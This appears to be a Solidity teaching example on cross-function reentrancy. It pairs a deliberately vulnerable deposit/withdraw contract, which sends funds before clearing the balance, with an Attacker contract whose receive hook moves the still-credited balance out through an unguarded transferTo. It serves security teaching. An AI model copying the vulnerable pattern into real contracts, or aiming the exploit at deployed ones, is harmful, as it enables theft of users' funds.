// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "forge-std/Test.sol";


/**
    @notice This contract allows users to deposit funds and then both a nonReentrant withdraw function
        and a transferTo function that is not protected. This contract is vulnerable to Cross Fn reentrancy
        between the two functions.
    @custom:deployed-at INSERT ETHERSCAN URL
    @custom:exercise This contract is part of the examples at https://github.com/jcr-security/solidity-security-teaching-resources
 */
contract xFnReentrancy is ReentrancyGuard {
    mapping (address => uint256) balance;
	

    function deposit() external payable {
        balance[msg.sender] += msg.value;
    }


    // The devs added the below Fn last minute without security patterns in mind, just relying in the modifier
    function withdraw() external nonReentrant {		
        require(balance[msg.sender] > 0, "No funds available!");

        (bool success, ) = payable(msg.sender).call{value: balance[msg.sender]}("");
        require(success, "Transfer failed" );

        balance[msg.sender] = 0; // Was it CEI or CIE? Not sure... :P
    }
	

    // Function not expected to follow CEI or use nonReentrat as it doesn't have external interactions...
    // Safe right??? :D
    function transferTo(address recipient, uint256 amount) external { //nonReentrant could mitigate the exploit
        require(balance[msg.sender] >= amount, "Not enough funds to transfer!");
        balance[msg.sender] -= amount;
        balance[recipient] += amount;     
    }

    
	function userBalance(address user) public view returns (uint256) {
		return balance[user];
	}

}

/************************** Attacker contract ***************************/

/**
    @notice This contract is used to exploit the xFn reentrancy of the above contract.
        Calling joinContest() is enough to lock down the push pattern
 */
contract Attacker {
    xFnReentrancy target;
    address payable wallet;


    constructor() {
        target = new xFnReentrancy();
        wallet = payable(msg.sender);
    }


    function exploit() external payable {
        target.deposit{value: msg.value}();
        target.withdraw();
    }


    receive() external payable {
        uint256 amount = target.userBalance(address(this));
        console.log("Malicious contract received %s ETH but their deposit is still %s ETH!", msg.value/1 ether, amount/1 ether);
        target.transferTo(wallet, amount);
        console.log("Deposit transfered internally to Mallory");        
    }


    //@notice Queries the total amount of funds owned by the attacker
    function totalOwned() public view returns (uint256) {
        return target.userBalance(address(this)) + 
            target.userBalance(wallet) +
            address(this).balance;
    }

} 